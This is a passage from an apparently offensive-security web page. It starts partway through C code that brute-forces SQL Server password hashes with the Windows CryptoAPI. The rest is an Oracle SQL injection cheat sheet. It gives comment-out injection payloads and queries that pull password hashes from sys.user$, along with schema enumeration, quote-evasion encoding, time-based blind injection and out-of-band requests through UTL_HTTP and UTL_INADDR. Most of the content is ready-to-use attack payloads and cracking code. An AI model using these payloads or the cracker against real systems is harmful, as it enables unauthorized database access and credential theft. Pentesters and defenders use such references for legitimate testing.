&lt;&lt; 8;<br />	       t = t &gt;&gt; 24;<br />	     x = (unsigned char) t;<br />	     uwttf[cnt]=x;<br />	     cnt++;<br />	     t = key &lt;&lt; 16;<br />	     t = t &gt;&gt; 24;<br />	     x = (unsigned char) t;<br />	     uwttf[cnt]=x;<br />	     cnt++;<br />	     t = key &lt;&lt; 24;<br />	     t = t &gt;&gt; 24;<br />	     x = (unsigned char) t;<br />	     uwttf[cnt]=x;<br />	     cnt++;<br />// Create the hash<br />if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &amp;hHash))<br />	     {<br />	               printf("Error %x during CryptCreatHash!\n", GetLastError());<br />	               return 0;<br />	     }<br />if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))<br />	     {<br />	               printf("Error %x during CryptHashData!\n", GetLastError());<br />	               return FALSE;<br />	     }<br />CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&amp;hl,0);<br />// Test the first byte only. Much quicker.<br />if(szhash[0] == cmp)<br />	     {<br />	               // If first byte matches try the rest<br />	               ptr = pucase;<br />	               cnt = 1;<br />	               while(cnt &lt; 20)<br />	               {<br />	                           ptr = ptr + 2;<br />	                           strncpy(pucfirst,ptr,2);<br />	                           sscanf(pucfirst,"%x",&amp;cmp);<br />	                           if(szhash[cnt]==cmp)<br />	                                    cnt ++;<br />	                           else<br />	                           {<br />	                                    break;<br />	                           }<br />	               }<br />	               if(cnt == 20)<br />	               {<br />	                    // We've found the password<br />	                    printf("\nA MATCH!!! Password is %s\n",wttf);<br />	                    return 0;<br />	                 }<br />	         }<br />	         count = 0;<br />	         cnt=0;<br />	       }<br />  return 0;<br />}<br />					               <br /><h1>Oracle</h1><br />    <br /><h2>Default Databases</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SYSTEM</td><td>Available in all versions</td></tr><tr><td>SYSAUX</td><td>Available in all versions</td></tr></table><br />    <br /><h2>Comment Out Query</h2><br />          The following can be used to comment out the rest of the query after your injection:     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>--</td><td>SQL comment</td></tr></table><br />    <br />    <em>Example:</em>         •       SELECT * FROM Users WHERE username = '' OR 1=1 <strong>--</strong>' AND password = '';     <br />        <br /><h2>Testing Version</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';</td></tr><tr><td>SELECT banner FROM v$version WHERE banner LIKE 'TNS%';</td></tr><tr><td>SELECT version FROM v$instance;</td></tr></table><br />          <em> Notes:      </em><br /><em>       •         All SELECT statements in Oracle must contain a table.       <br />       •         </em><em><code>         dual        </code></em><em>        is a dummy table which can be used for testing.       <br />      </em>    <br />    <br /><h2>Database Credentials</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SELECT username FROM all_users;</td><td>Available on all versions</td></tr><tr><td>SELECT name, password from sys.user$;</td><td>Privileged, &lt;= 10g</td></tr><tr><td>SELECT name, spare4 from sys.user$;</td><td>Privileged, &lt;= 11g</td></tr></table><br />    <br /><h2>Database Names</h2><br />    <br /><h3>Current Database</h3><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>SELECT name FROM v$database;</td></tr><tr><td>SELECT instance_name FROM v$instance</td></tr><tr><td>SELECT global_name FROM global_name</td></tr><tr><td>SELECT SYS.DATABASE_NAME FROM DUAL</td></tr></table><br />    <br /><h3>User Databases</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;DISTINCT&nbsp;owner&nbsp;FROM&nbsp;all_tables;</div></div><br />    <br /><h2>Server Hostname</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>SELECT host_name FROM v$instance; (Privileged)</td></tr><tr><td>SELECT UTL_INADDR.get_host_name FROM dual;</td></tr><tr><td>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;</td></tr><tr><td>SELECT UTL_INADDR.get_host_address FROM dual;</td></tr></table><br />    <br /><h2>Tables and Columns</h2><br />    <br /><h3>Retrieving Tables</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;table_name&nbsp;FROM&nbsp;all_tables;</div></div><br />    <br /><h3>Retrieving Columns</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;column_name&nbsp;FROM&nbsp;all_tab_columns;</div></div><br />    <br /><h3>Find Tables from Column Name</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;column_name&nbsp;FROM&nbsp;all_tab_columns&nbsp;WHERE&nbsp;table_name&nbsp;=&nbsp;'Users';</div></div><br />    <br /><h3>Find Columns From Table Name</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;table_name&nbsp;FROM&nbsp;all_tab_tables&nbsp;WHERE&nbsp;column_name&nbsp;=&nbsp;'password';</div></div><br />    <br /><h3>Retrieving Multiple Tables at once</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;RTRIM(XMLAGG(XMLELEMENT(e,&nbsp;table_name&nbsp;||&nbsp;',')).EXTRACT('//text()').EXTRACT('//text()')&nbsp;,',')&nbsp;FROM&nbsp;all_tables;</div></div><br />    <br /><h2>Avoiding the use of quotations</h2><br />          Unlike other RDBMS, Oracle allows table/column names to be encoded.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SELECT 0x09120911091 FROM dual;</td><td>Hex Encoding.</td></tr><tr><td>SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;</td><td>CHR() Function.</td></tr></table><br />    <br /><h2>String Concatenation</h2><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;'a'||'d'||'mi'||'n'&nbsp;FROM&nbsp;dual;</div></div><br />    <br /><h2>Conditional Statements</h2><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;CASE&nbsp;WHEN&nbsp;1=1&nbsp;THEN&nbsp;'true'&nbsp;ELSE&nbsp;'false'&nbsp;END&nbsp;FROM&nbsp;dual</div></div><br />    <br /><h2>Timing</h2><br />    <br /><h3>Time Delay</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;UTL_INADDR.get_host_address('non-existant-domain.com')&nbsp;FROM&nbsp;dual;</div></div><br />    <br /><h3>Heavy Time Delays</h3><br />    <div class="codebox"><div class="codebox">AND&nbsp;(SELECT&nbsp;COUNT(*)&nbsp;FROM&nbsp;all_users&nbsp;t1,&nbsp;all_users&nbsp;t2,&nbsp;all_users&nbsp;t3,&nbsp;all_users&nbsp;t4,&nbsp;all_users&nbsp;t5)&nbsp;&gt;&nbsp;0&nbsp;AND&nbsp;300&nbsp;&gt;&nbsp;ASCII(SUBSTR((SELECT&nbsp;username&nbsp;FROM&nbsp;all_users&nbsp;WHERE&nbsp;rownum&nbsp;=&nbsp;1),1,1));</div></div><br />    <br /><h2>Privileges</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>SELECT privilege FROM session_privs;</td></tr><tr><td>SELECT grantee, granted_role FROM dba_role_privs; (Privileged)</td></tr></table><br />    <br /><h2>Out Of Band Channeling</h2><br />    <br /><h3>DNS Requests</h3><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;</td></tr><tr><td>SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;</td></tr></table><br /></div></body></html>